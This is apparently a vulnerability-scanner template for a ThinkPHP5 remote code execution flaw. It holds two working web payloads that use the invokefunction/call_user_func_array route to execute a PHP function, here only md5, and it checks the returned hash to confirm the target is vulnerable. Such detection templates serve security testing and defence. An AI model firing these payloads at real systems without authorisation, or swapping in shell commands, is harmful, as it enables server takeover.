id: thinkphp5-rce
info:
  name: ThinkPHP5 Remote Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,thinkphp,thinkphp5

http:
  - payloads:
      r_payloads:
        - /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=31337
        - /?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=31337
    attack: batteringram
    raw:
      - |
        GET {{r_payloads}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "6f3249aa304055d63828af3bfab778f6"
